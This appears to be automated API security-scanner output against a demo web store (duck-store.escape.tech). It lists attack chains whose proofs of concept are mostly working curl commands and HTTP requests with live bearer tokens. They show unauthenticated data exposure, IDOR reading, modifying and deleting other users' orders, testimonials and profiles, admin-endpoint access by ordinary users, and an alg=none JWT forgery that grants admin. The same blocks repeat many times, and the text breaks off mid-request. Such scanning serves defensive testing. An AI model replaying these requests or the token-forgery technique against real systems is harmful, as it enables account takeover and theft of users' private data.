- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/users/ · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/users/ returned 200 with a 706B protected-data body (no session required)`
  - session → cross_principal_read: With a valid session the attacker can invoke the privileged functions a broken-function-level-authorization flaw fails to gate. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `# As user_a (role: "user", not admin)
curl "https://duck-store.escape.tech/api/v1/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response includes ALL users including admins:
# [{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","role":"admin",...},
#  {"username":"escape_scanner_priv","email":"escape.security.priv@email.com","id":"6ba7b817-9dad-11d1-80b4-00c04fd430c8","role":"admin",...},
#  ... all other users ...]

# user_a's JWT payload shows role: "user" not "admin"`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/users/ · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/users/ returned 200 with a 706B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/users/ · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/users/ returned 200 with a 706B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/users/ · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/users/ returned 200 with a 706B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/orders/coupons · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/orders/coupons returned 200 with a 963B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/orders/coupons · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/orders/coupons returned 200 with a 963B protected-data body (no session required)`
  - session → cross_principal_read: With a valid session the attacker can invoke the privileged functions a broken-function-level-authorization flaw fails to gate. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `# As user_a (role: "user", not admin)
curl "https://duck-store.escape.tech/api/v1/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response includes ALL users including admins:
# [{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","role":"admin",...},
#  {"username":"escape_scanner_priv","email":"escape.security.priv@email.com","id":"6ba7b817-9dad-11d1-80b4-00c04fd430c8","role":"admin",...},
#  ... all other users ...]

# user_a's JWT payload shows role: "user" not "admin"`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/orders/coupons · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/orders/coupons returned 200 with a 963B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/orders/coupons · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/orders/coupons returned 200 with a 963B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/orders/coupons · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/orders/coupons returned 200 with a 963B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/reviews/product/2/stats · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/reviews/product/2/stats returned 200 with a 81B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/reviews/product/2/stats · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/reviews/product/2/stats returned 200 with a 81B protected-data body (no session required)`
  - session → cross_principal_read: With a valid session the attacker can invoke the privileged functions a broken-function-level-authorization flaw fails to gate. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `# As user_a (role: "user", not admin)
curl "https://duck-store.escape.tech/api/v1/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response includes ALL users including admins:
# [{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","role":"admin",...},
#  {"username":"escape_scanner_priv","email":"escape.security.priv@email.com","id":"6ba7b817-9dad-11d1-80b4-00c04fd430c8","role":"admin",...},
#  ... all other users ...]

# user_a's JWT payload shows role: "user" not "admin"`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/reviews/product/2/stats · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/reviews/product/2/stats returned 200 with a 81B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/reviews/product/2/stats · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/reviews/product/2/stats returned 200 with a 81B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/reviews/product/2/stats · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/reviews/product/2/stats returned 200 with a 81B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: session → cross_principal_read
  - session — POST https://duck-store.escape.tech/api/v1/auth/login (JWT validation on all protected endpoints) · PoC: `1. Original user_a token (HS256): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDAwfQ.jjm1FNMyQsfAxt3FEemcaRAUeX9QpHRpTSpgz3afX-I

2. Forged token with alg=none and role=admin: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MDY0NjQwMH0.

3. Request with forged token:
```
GET /api/v1/admin/users HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MDY0NjQwMH0.
```

4. Response: 200 OK with full user list including admin users

5. Also works on /api/v1/users/me/profile (200 OK) and /api/v1/users/ (200 OK)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → cross_principal_read
  - session — POST https://duck-store.escape.tech/api/v1/auth/login (JWT validation on all protected endpoints) · PoC: `1. Original user_a token (HS256): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDAwfQ.jjm1FNMyQsfAxt3FEemcaRAUeX9QpHRpTSpgz3afX-I

2. Forged token with alg=none and role=admin: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MDY0NjQwMH0.

3. Request with forged token:
```
GET /api/v1/admin/users HTTP/1.1
Host: duck-store.escape.tech
